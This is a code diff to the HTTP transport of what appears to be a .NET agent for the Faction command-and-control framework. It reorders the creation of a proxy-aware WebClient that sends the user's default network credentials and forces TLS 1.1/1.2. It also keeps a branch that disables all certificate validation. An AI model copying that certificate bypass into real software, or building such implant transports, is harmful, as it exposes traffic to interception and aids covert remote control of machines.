@@ -49,11 +49,9 @@ namespace Faction.Modules.Dotnet
 #if DEBUG
         Logging.Log($"Creating Web Client..");
 #endif
-      WebClient _webClient = new WebClient();
 
-      // add proxy aware webclient settings
-      _webClient.Proxy = WebRequest.DefaultWebProxy;
-      _webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+      //force Tls 1.1 or Tls 1.2 because Tls 1.0 not works!
+      ServicePointManager.SecurityProtocol = (SecurityProtocolType)( 0x300 | 0xc00 );
 
       if (ignoreSSL)
       {
@@ -63,6 +61,12 @@ namespace Faction.Modules.Dotnet
         //Change SSL checks so that all checks pass
         ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
       }
+
+      WebClient _webClient = new WebClient();
+
+      // add proxy aware webclient settings
+      _webClient.Proxy = WebRequest.DefaultWebProxy;
+      _webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
 
       if (profile == "HttpGet")
       {
